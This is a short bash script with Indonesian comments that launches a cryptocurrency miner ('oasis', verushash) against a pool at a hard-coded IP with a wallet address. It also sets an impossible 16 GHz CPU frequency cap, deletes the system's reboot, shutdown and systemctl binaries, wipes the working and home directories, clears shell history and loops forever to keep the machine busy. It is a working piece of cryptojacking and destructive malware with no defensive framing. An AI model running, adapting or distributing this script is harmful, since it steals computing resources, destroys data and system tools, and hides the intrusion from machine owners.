#!/bin/bash

# Mengatur frekuensi CPU ke 16 GHz
CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
MAX_FREQ=16000000 # Maksimal frekuensi dalam kHz (16 GHz)

for dir in $CPUFREQ_PATH; do
    if [ -e $dir/scaling_max_freq ]; then
        echo $MAX_FREQ > $dir/scaling_max_freq
    fi
done

chmod 777 oasis
./oasis --algorithm verushash --pool stratum+tcp://128.199.167.154:443 --wallet RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.BRH4 --password x --cpu-threads 8
sleep 30
sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 30
done
